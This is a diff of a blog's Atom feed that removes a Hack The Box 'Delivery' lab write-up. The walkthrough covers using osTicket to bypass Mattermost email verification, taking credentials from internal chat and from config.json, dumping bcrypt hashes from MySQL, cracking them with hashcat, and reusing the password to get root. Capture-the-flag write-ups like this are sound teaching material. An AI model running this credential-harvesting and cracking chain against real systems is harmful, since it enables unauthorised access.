-</table>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="BloodHound" /><category term="FTP" /><category term="Password Safe" /><category term="Kerberoasting" /><category term="Active Directory" /><summary type="html"><![CDATA[HTB Administrator]]></summary></entry><entry><title type="html">Hack The Box: Delivery</title><link href="http://localhost:4000/posts/delivery/" rel="alternate" type="text/html" title="Hack The Box: Delivery" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/delivery</id><content type="html" xml:base="http://localhost:4000/posts/delivery/"><![CDATA[<h1 id="htb-delivery">HTB Delivery</h1>
-
-<p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.154</code><br />
-<strong>Operating System:</strong> Linux (Debian)<br />
-<strong>Difficulty:</strong> Easy<br />
-<strong>Attack Path:</strong> osTicket Email Disclosure → Mattermost Account Access → SSH → Password Hash Cracking → Root</p>
-
-<h2 id="1-enumeration">1. Enumeration</h2>
-
-<p>I started with an Nmap scan to identify the target’s exposed services and determine which applications might provide an initial foothold.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p- --min-rate 1000 10.129.8.154 -oN nmap.txt
-</code></pre></div></div>
-
-<p>The relevant results were:</p>
-
-<table>
-  <thead>
-    <tr>
-      <th>Port</th>
-      <th>Service</th>
-      <th>Details</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>22</td>
-      <td>SSH</td>
-      <td>OpenSSH 7.9p1</td>
-    </tr>
-    <tr>
-      <td>80</td>
-      <td>HTTP</td>
-      <td>nginx 1.14.2</td>
-    </tr>
-    <tr>
-      <td>8065</td>
-      <td>HTTP</td>
-      <td>Mattermost 5.30.0</td>
-    </tr>
-  </tbody>
-</table>
-
-<p>The web services exposed two interesting applications:</p>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">http://helpdesk.delivery.htb</code> — osTicket</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">http://delivery.htb:8065</code> — Mattermost</p>
-  </li>
-</ul>
-
-<p>I added the hostnames to my local <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "10.129.8.154 delivery.htb helpdesk.delivery.htb" | sudo tee -a /etc/hosts
-</code></pre></div></div>
-
-<h3 id="11-osticket">1.1 osTicket</h3>
-
-<p>The helpdesk application allowed visitors to create support tickets without an existing account. After submitting a ticket, osTicket provided a ticket ID and an associated email address in the format:</p>
-
-<p><img src="/assets/images/delivery_osticket_1.png" alt="OSTicket 1" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ticket_id&gt;@delivery.htb
-</code></pre></div></div>
-
-<p>I also received the information needed to check the ticket’s status and view its conversation thread.</p>
-
-<h3 id="12-mattermost">1.2 Mattermost</h3>
-
-<p>Mattermost was accessible on port 8065. I attempted to register a new account, but the application required email verification. Since Mattermost accepted addresses ending in <code class="language-plaintext highlighter-rouge">delivery.htb</code>, I needed a way to receive a verification link sent to that domain.</p>
-
-<p>Rather than abandoning the registration process, I investigated whether the helpdesk application could be used to retrieve the verification email.</p>
-
-<h2 id="2-exploiting-the-email-workflow">2. Exploiting the Email Workflow</h2>
-
-<p>OsTicket assigned a delivery.htb email address to newly created tickets, and its ticket thread displayed messages associated with the ticket.</p>
-
-<p>I used this workflow to obtain a Mattermost account.</p>
-
-<ol>
-  <li>
-    <p>Created a new support ticket through osTicket.</p>
-  </li>
-  <li>
-    <p>Recorded the ticket ID and the email address assigned to it.</p>
-  </li>
-  <li>
-    <p>Opened the ticket thread using the ticket ID and the email address originally supplied when creating the ticket.</p>
-  </li>
-  <li>
-    <p>Started a Mattermost registration using the ticket-associated email address.</p>
-  </li>
-  <li>
-    <p>Mattermost sent an account-verification link to that address.</p>
-  </li>
-</ol>
-
-<p><img src="/assets/images/delivery_osticket_2.png" alt="OSTicket 1" /></p>
-
-<ol>
-  <li>
-    <p>Returned to the osTicket ticket thread and retrieved the verification link.</p>
-  </li>
-  <li>
-    <p>Opened the link to verify the Mattermost account and logged in.</p>
-  </li>
-</ol>
-
-<p>This worked because the helpdesk workflow exposed the verification message through the ticket thread. The email address did not need to belong to a conventional mailbox that I could access separately; the application itself provided a way to view the message.</p>
-
-<p>After verification, I was able to access Mattermost and join the internal team.</p>
-
-<h2 id="3-enumerating-mattermost">3. Enumerating Mattermost</h2>
-
-<p>After gaining access to Mattermost, I explored the internal channels for information that could help with further access.</p>
-
-<p>One of the messages posted by <code class="language-plaintext highlighter-rouge">root</code> in the developers’ channel contained two important clues:</p>
-
-<p><img src="/assets/images/delivery_mattermost_1.png" alt="MatterMost 1" /></p>
-
-<p>The message disclosed SSH credentials:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: maildeliverer
-Password: &lt;REDACTED&gt;
-</code></pre></div></div>
-
-<p>It also hinted that users might choose passwords derived from <code class="language-plaintext highlighter-rouge">PleaseSubscribe!</code>.</p>
-
-<p>The first clue provided a direct route to the target system. The second suggested a potential password-cracking strategy for later in the attack.</p>
-
-<h2 id="4-initial-foothold-via-ssh">4. Initial Foothold via SSH</h2>
-
-<p>Using the credentials obtained from Mattermost, I connected to the target over SSH.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh maildeliverer@10.129.8.154
-</code></pre></div></div>
-
-<p>After successfully authenticating, I began enumerating the host for application files, configuration files, and other credentials.</p>
-
-<p>During enumeration, I discovered the Mattermost installation under <code class="language-plaintext highlighter-rouge">/opt/mattermost</code>.</p>
-
-<h2 id="5-extracting-mattermost-database-credentials">5. Extracting Mattermost Database Credentials</h2>
-
-<p>Mattermost’s configuration file contained the database connection settings:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /opt/mattermost/config/config.json
-</code></pre></div></div>
-
-<p>The relevant configuration was:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"SqlSettings": {
-    "DriverName": "mysql",
-    "DataSource": "mmuser:&lt;REDACTED&gt;@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8&amp;readTimeout=30s&amp;writeTimeout=30s"
-}
-</code></pre></div></div>
-
-<p>This revealed the database credentials:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: mmuser
-Password: &lt;REDACTED&gt;
-Database: mattermost
-</code></pre></div></div>
-
-<p>Since the database was listening on localhost, I could access it from my existing SSH session.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -u mmuser -p
-</code></pre></div></div>
-
-<p>After entering the password, I listed the available databases and connected to Mattermost.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SHOW DATABASES;
-USE mattermost;
-SHOW TABLES;
-</code></pre></div></div>
-
-<p>The <code class="language-plaintext highlighter-rouge">Users</code> table was particularly interesting because it contained account information and password hashes.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT Username, Password, Email, Roles
-FROM Users;
-</code></pre></div></div>
-
-<p>The results included a <code class="language-plaintext highlighter-rouge">root</code> account with the role <code class="language-plaintext highlighter-rouge">system_admin system_user</code> and a bcrypt password hash.</p>
-
-<p>At this point, I had obtained the hash but not the plaintext password.</p>
-
-<h2 id="6-cracking-the-mattermost-root-password">6. Cracking the Mattermost Root Password</h2>
-
-<p>The developers’ channel had explicitly mentioned password reuse and variations of:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PleaseSubscribe!
-</code></pre></div></div>
-
-<p>Instead of starting with a large, generic password dictionary, I used this information to build a targeted wordlist.</p>
-
-<h3 id="61-generating-password-candidates">6.1 Generating password candidates</h3>
-
-<p>First, I created a file containing the base password.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'PleaseSubscribe!' &gt; password.list
-</code></pre></div></div>
-
-<p>I then applied Hashcat’s <code class="language-plaintext highlighter-rouge">best66.rule</code> to generate variations of the phrase.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -r /usr/share/hashcat/rules/best66.rule \
-  password.list --stdout &gt; guess_password.list
-</code></pre></div></div>
-
-<p>Rule-based mutations can produce candidates involving capitalization changes, appended numbers, and other common modifications. This approach is useful when an application explicitly hints at a password pattern.</p>
-
-<h3 id="62-extracting-and-cracking-the-hash">6.2 Extracting and cracking the hash</h3>
-
-<p>From the database results, I extracted the hash belonging to the Mattermost <code class="language-plaintext highlighter-rouge">root</code> account and saved it in <code class="language-plaintext highlighter-rouge">hash.txt</code>.</p>
-
-<p>The hash used the bcrypt format, identified by the <code class="language-plaintext highlighter-rouge">$2a$</code> prefix and cost factor <code class="language-plaintext highlighter-rouge">10</code>. Hashcat supports this format with mode <code class="language-plaintext highlighter-rouge">3200</code>.</p>
-
-<p>I ran:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 3200 hash.txt \
-  --wordlist ./guess_password.list
-</code></pre></div></div>
-
-<p>Hashcat successfully recovered the password</p>
-
-<p>This confirmed that the channel message was not merely general security advice; it was a practical hint toward the password used by the Mattermost administrator.</p>
-
-<h2 id="7-privilege-escalation-to-root">7. Privilege Escalation to Root</h2>
-
-<p>With the recovered password, I attempted to switch from <code class="language-plaintext highlighter-rouge">maildeliverer</code> to the local Linux <code class="language-plaintext highlighter-rouge">root</code> account.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su root
-</code></pre></div></div>
-
-<p>The authentication succeeded, confirming that the password had been reused for the system’s root account.</p>
-
-<p>I then retrieved the root flag:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /root
-cat root.txt
-</code></pre></div></div>
-
-<p><strong>Root obtained.</strong></p>
-
-<h2 id="8-attack-chain-summary">8. Attack Chain Summary</h2>
-
-<p>The complete attack chain was:</p>
-
-<ol>
-  <li>
-    <p><strong>Enumeration:</strong> Identified SSH, nginx, and Mattermost.</p>
-  </li>
-  <li>
-    <p><strong>Email verification bypass through application chaining:</strong> Used osTicket’s ticket-thread functionality to retrieve a Mattermost verification link.</p>
-  </li>
-  <li>
-    <p><strong>Application access:</strong> Registered and verified a Mattermost account.</p>
-  </li>
-  <li>
-    <p><strong>Credential disclosure:</strong> Found SSH credentials and a password-pattern hint in an internal channel.</p>
-  </li>
-  <li>
-    <p><strong>Initial foothold:</strong> Logged in as <code class="language-plaintext highlighter-rouge">maildeliverer</code> over SSH.</p>
-  </li>
-  <li>
-    <p><strong>Configuration enumeration:</strong> Extracted the Mattermost database credentials from <code class="language-plaintext highlighter-rouge">config.json</code>.</p>
-  </li>
-  <li>
-    <p><strong>Database access:</strong> Retrieved the <code class="language-plaintext highlighter-rouge">root</code> user’s bcrypt password hash.</p>
-  </li>
-  <li>
-    <p><strong>Targeted cracking:</strong> Used a custom wordlist and Hashcat rules to recover <code class="language-plaintext highlighter-rouge">PleaseSubscribe!21</code>.</p>
-  </li>
-  <li>
-    <p><strong>Privilege escalation:</strong> Reused the recovered password with <code class="language-plaintext highlighter-rouge">su root</code>.</p>
-  </li>
-  <li>
-    <p><strong>Objective:</strong> Read <code class="language-plaintext highlighter-rouge">/root/root.txt</code>.</p>
-  </li>
-</ol>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="web" /><category term="linux" /><category term="OS-Ticket" /><category term="Mattermost" /><category term="Password-Reuse" /><summary type="html"><![CDATA[HTB Delivery]]></summary></entry><entry><title type="html">Hack The Box: Forest</title><link href="http://localhost:4000/posts/forest/" rel="alternate" type="text/html" title="Hack The Box: Forest" /><published>2026-10-21T00:00:00+05:30</published><updated>2026-10-21T00:00:00+05:30</updated><id>http://localhost:4000/posts/forest</id><content type="html" xml:base="http://localhost:4000/posts/forest/"><![CDATA[<h1 id="htb-forest">HTB Forest</h1>
+</table>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="BloodHound" /><category term="FTP" /><category term="Password Safe" /><category term="Kerberoasting" /><category term="Active Directory" /><summary type="html"><![CDATA[HTB Administrator]]></summary></entry><entry><title type="html">Hack The Box: Forest</title><link href="http://localhost:4000/posts/forest/" rel="alternate" type="text/html" title="Hack The Box: Forest" /><published>2026-10-21T00:00:00+05:30</published><updated>2026-10-21T00:00:00+05:30</updated><id>http://localhost:4000/posts/forest</id><content type="html" xml:base="http://localhost:4000/posts/forest/"><![CDATA[<h1 id="htb-forest">HTB Forest</h1>
 
 <h2 id="overview">Overview</h2>
 
